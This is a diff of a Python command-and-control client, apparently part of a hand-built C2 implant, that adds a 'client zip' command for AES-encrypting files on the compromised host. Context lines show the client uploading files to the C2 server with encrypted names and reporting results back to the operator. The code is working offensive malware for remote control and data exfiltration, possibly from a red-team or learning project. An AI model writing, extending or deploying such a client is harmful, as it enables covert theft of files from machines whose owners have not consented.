@@ -2,13 +2,15 @@
 """
 C2 Client side code
 """
-from os import chdir, getenv, uname, getcwd
+from os import chdir, getenv, uname, getcwd, mkdir, path
 
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post, put
 from crypt import cipher
-from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
+from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, \
+                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
 timestamp = str(int(time.time()))
@@ -89,6 +91,24 @@ while True:
                 put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
         except IndexError:
             post_to_server("You must enter the filepath to upload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on {client}.\n")
+        
+    elif cmd.startswith('client zip'):
+        filepath = None
+        try:
+            filepath = cmd.split()[2] # command client download FILENAME
+            
+            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
+                zip_file.setpassword(ZIP_PASSWORD)
+                
+                if path.isdir(filepath):
+                    post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n") # v1.0 of zipper
+                else:
+                    zip_file.write(filepath)
+                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
+        except IndexError:
+            post_to_server("You must enter the filepath to zip.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
